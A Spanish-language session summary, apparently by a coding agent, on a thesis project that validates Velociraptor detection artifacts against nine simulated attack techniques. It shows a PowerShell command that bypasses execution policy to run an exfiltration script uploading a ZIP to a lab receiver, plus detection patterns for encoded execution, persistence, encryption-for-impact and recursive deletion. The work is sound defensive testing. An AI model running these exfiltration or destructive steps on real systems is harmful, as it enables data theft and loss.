# RESUMEN FINAL PARA CHATGPT

Fecha: 2026-06-15

## 1. Archivos creados/modificados

Archivos nuevos principales:

| Ruta | Proposito |
|---|---|
| `01_ARTIFACTS/candidate/Custom.TFM.HIDS.P1.Low.Basic.Event_v1.yaml` | Artifact CLIENT_EVENT P1 bajo coste, cobertura 9/9. |
| `01_ARTIFACTS/candidate/Custom.TFM.HIDS.P2.High.Forensic.Event_v1.yaml` | Artifact CLIENT_EVENT P2 forense, cobertura 9/9. |
| `01_ARTIFACTS/candidate/Custom.TFM.HIDS.P3.Medium.Behavioral.Event_v1.yaml` | Artifact CLIENT_EVENT P3 alertabilidad, cobertura 9/9. |
| `03_RUNNERS/TFM_Run_All_TEC_Tests_v5.ps1` | Runner v5 derivado de v4 con TEC-009 corregida. |
| `03_RUNNERS/TFM_Collect_Final_Evidence_v1.ps1` | Recogida local post-campana de evidencias. |
| `07_DOCS/CHECKLIST_PREVIO_LOGGING_VR.md` | Checklist previo de logging, Sysmon y receiver. |
| `07_DOCS/EJECUCION_FINAL_P1_P2_P3_EVENT_Y_RUNNER_V5.md` | Guia paso a paso de ejecucion final. |
| `07_DOCS/MATRIZ_COBERTURA_FINAL_P1_P2_P3_EVENT.md` | Matriz de cobertura 9/9. |
| `07_DOCS/RESUMEN_TECNICO_CAMBIOS_EVENT_FINAL.md` | Resumen tecnico de cambios. |
| `07_DOCS/VALIDACION_LOCAL_EVENT_FINAL.md` | Validacion local realizada. |
| `ultima_iteracion_event_final/` | Paquete final con copias, hashes y ZIP. |

No se han modificado receiver, router, Discord, artifacts historicos P1/P2/P3, P4 ni scripts de ataque.

Hay un cambio no relacionado ya presente en Git:

```text
 M 08_MEMORIA/TFM/TFM.one
```

No se ha revertido ni tocado.

Tambien se han actualizado los ficheros de cierre de sesion exigidos por `AGENTS.md`:

- `00_CONTEXT/PROJECT_STATE.md`
- `00_CONTEXT/CURRENT_TASK.md`
- `00_CONTEXT/DECISIONS.md`
- `00_CONTEXT/SESSION_LOGS/LAST_SESSION.md`
- `00_CONTEXT/SESSION_LOGS/session_20260615_2137.md`

## 2. Cambios en runner v5

`TFM_Run_All_TEC_Tests_v5.ps1` mantiene compatibilidad con v4:

- resumen TXT;
- resumen JSON;
- resumen CSV;
- logs por campana;
- contadores OK/WARN/FAIL;
- TEC-001 a TEC-008 sin redisenar.

Cambio critico en TEC-009:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "<ruta>\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -EnableUpload -TimeoutSec 60 -KeepArtifacts
```

Ademas registra:

- hora local inicio/fin;
- hora UTC inicio/fin;
- comando ejecutado;
- ruta del script TEC-009;
- summary JSON;
- ZIP;
- copia ZIP;
- SHA256;
- HTTP status;
- `UploadSucceeded`;
- seccion final `TEC-009 EVIDENCE CHECK`.

## 3. Aprendizaje TEC-009

Se observo que la llamada directa al script podia registrar en 4104 solo el lanzador. La ejecucion explicita con `powershell.exe -File` fuerza un proceso PowerShell completo y aumenta la probabilidad de que Script Block Logging capture el cuerpo de `exfiltracion_v3.ps1`.

Evidencia fuerte esperada en 4104:

- `Invoke-WebRequest`;
- `-Method POST`;
- `-InFile`;
- `application/zip`;
- `ReceiverUrl`;
- referencias `.zip`.

## 4. Por que `powershell.exe -File`

La deteccion principal de TEC-009 depende de 4104 fuerte. Si el runner invoca el script de forma que solo se registra el wrapper, P3 no puede ver `Invoke-WebRequest -InFile application/zip`.

Por eso runner v5 ejecuta TEC-009 siempre mediante proceso PowerShell explicito. Sysmon ID 1/3/11 queda como soporte contextual, no como condicion obligatoria.

## 5. Cobertura P1/P2/P3 EVENT

| TEC | Fuente principal | P1 EVENT | P2 EVENT | P3 EVENT | Confidence esperada | Severity |
|---|---|---|---|---|---|---|
| TEC-001 | PowerShell 4104 / Sysmon ID 1 | Si | Si | Si | HIGH por 4104 | High |
| TEC-002 | Sysmon ID 1 cmd/powershell | Si | Si | Si | MEDIUM | Medium |
| TEC-003 | Sysmon ID 1 schtasks / Security opcional | Si | Si | Si | MEDIUM | Medium |
| TEC-004 | Sysmon registry ID 12/13/14 / reg.exe | Si | Si | Si | MEDIUM | High |
| TEC-005 | System 7045 / sc.exe | Si | Si | Si | HIGH/MEDIUM | High |
| TEC-006 | PowerShell 4104 / Sysmon ID 1 | Si | Si | Si | HIGH por 4104 | Medium |
| TEC-007 | PowerShell 4104 crypto | Si | Si | Si | HIGH por 4104 | Critical |
| TEC-008 | PowerShell 4104 borrado | Si | Si | Si | HIGH por 4104 | Critical |
| TEC-009 | PowerShell 4104 HTTP ZIP upload | Si | Si | Si | HIGH por 4104 | High |

## 6. Fuentes por tecnica

| TEC | Deteccion | Contexto |
|---|---|---|
| TEC-001 | `ExecutionPolicy Bypass`, `FromBase64String`, `IEX`, encoded/base64 en 4104 | Sysmon ID 1 PowerShell |
| TEC-002 | `cmd.exe /c`, operadores de encadenado, proceso hijo PowerShell | Parent/child en Sysmon ID 1 |
| TEC-003 | `schtasks /create`, `/run`, `/delete` | Security 4698/4699 si existe |
| TEC-004 | Run Key por `reg.exe` o Sysmon ID 12/13/14 | `HKCU/HKLM ... CurrentVersion\Run` |
| TEC-005 | System 7045 o `sc.exe create/start/delete` | Sysmon ID 1 |
| TEC-006 | `SecurityCenter2`, `AntivirusProduct`, Defender, WMI/CIM | Sysmon ID 1 |
| TEC-007 | `System.Security.Cryptography`, `Aes`, `CryptoStream`, `CreateEncryptor`, `.aes` | Sysmon ID 11 `.aes` si aparece |
| TEC-008 | `Remove-Item`, `Get-ChildItem`, `-Force`, `-Recurse` | Sysmon ID 23/26 solo forense si aparece |
| TEC-009 | HTTP tool + `-InFile`/upload + ZIP/upload/ReceiverUrl en 4104 | Sysmon ID 1/3/11 |

## 7. Evidencias esperadas en Velociraptor

P3 EVENT debe emitir especialmente:

- `TEC009_HTTP_ZIP_Upload_4104` con `Confidence=HIGH`;
- `TEC009_HTTP_Upload_Sysmon_Process_Context` si Sysmon ID 1 ve PowerShell con argumentos compatibles;
- `TEC009_HTTP_Network_Sysmon_Context` si Sysmon ID 3 ve destino `192.168.1.129:8088`;
- `TEC009_ZIP_FileCreate_Sysmon_Context` si Sysmon ID 11 ve ZIP;
- `TEC007_DataEncryptedForImpact_4104`;
- `TEC008_DataDestruction_4104`.

Si Sysmon ID 3 no aparece, TEC-009 sigue siendo valida si existe la alerta HIGH por 4104.

## 8. Pendiente de validacion manual

Pendiente en GUI Velociraptor:

1. importar P1/P2/P3 EVENT;
2. activarlos como Client Event Monitoring antes de ejecutar runner v5;
3. ejecutar receiver;
4. ejecutar runner v5;
5. exportar eventos;
6. confirmar 9/9 tecnicas;
7. confirmar `TEC009_HTTP_ZIP_Upload_4104` por 4104 fuerte;
8. ejecutar `TFM_Collect_Final_Evidence_v1.ps1` para guardar evidencia local.

## 9. Hashes SHA256 principales

```text
29A8A81F1CED7967DD3ED6B156B4E1C424A3FAA23F2CDA2DAA1CEDCDADDE07F9  01_ARTIFACTS\candidate\Custom.TFM.HIDS.P1.Low.Basic.Event_v1.yaml
255C5F7CA39E362FE45106C662C4C35730EFF57A4063A1E9973FD11A6375FAA2  01_ARTIFACTS\candidate\Custom.TFM.HIDS.P2.High.Forensic.Event_v1.yaml
C591CB849753194F6F87834C1E0F34EDE6CDFF6B31BC63650A1D281ADA1D410A  01_ARTIFACTS\candidate\Custom.TFM.HIDS.P3.Medium.Behavioral.Event_v1.yaml
26BE3E1BBEDAC45D3BD4C39645A7237C9F879A74B036753C1964B21E7F730997  03_RUNNERS\TFM_Run_All_TEC_Tests_v5.ps1
1005B3BB4D82FFE08C82A6722E42867B70DA444E62320727E062494243FBB638  03_RUNNERS\TFM_Collect_Final_Evidence_v1.ps1
04088A64411257053BC2839343B434F36A5B6AEC234F32168400D27B2B6C08FF  07_DOCS\CHECKLIST_PREVIO_LOGGING_VR.md
1B9C3DD6AE02A1B2486B4A73310660B62E5C078E3F1CEEF0D943D6A8218AB46E  07_DOCS\EJECUCION_FINAL_P1_P2_P3_EVENT_Y_RUNNER_V5.md
9466703CE048D936B8AFD95E8208E668B050A45031D0930AF86357416C33FC28  07_DOCS\MATRIZ_COBERTURA_FINAL_P1_P2_P3_EVENT.md
71F64C25EE7B298FDB155D618FC88148E76B11D5FDA819202BD96EC37472FE4D  07_DOCS\RESUMEN_TECNICO_CAMBIOS_EVENT_FINAL.md
8FC02BDA66B81EF8353205FDCA0A0267F6B7E1B18FBFEE25D7375EA93B243F38  07_DOCS\VALIDACION_LOCAL_EVENT_FINAL.md
```

El paquete incluye tambien `hashes/SHA256SUMS.txt` y `ultima_iteracion_event_final.zip.sha256`.

## 10. Git diff --stat

Salida observada:

```text
00_CONTEXT/CURRENT_TASK.md              | 213 +++++++++++---------------------
00_CONTEXT/DECISIONS.md                 |  48 +++++++
00_CONTEXT/PROJECT_STATE.md             |  11 ++
00_CONTEXT/SESSION_LOGS/LAST_SESSION.md | 103 ++++++++-------
08_MEMORIA/TFM/TFM.one                  | Bin 7081448 -> 7081928 bytes
5 files changed, 187 insertions(+), 188 deletions(-)
```

Los entregables nuevos aparecen como `??` en `git status --short` porque son archivos no trackeados. El cambio binario de `08_MEMORIA/TFM/TFM.one` no forma parte de esta iteracion.
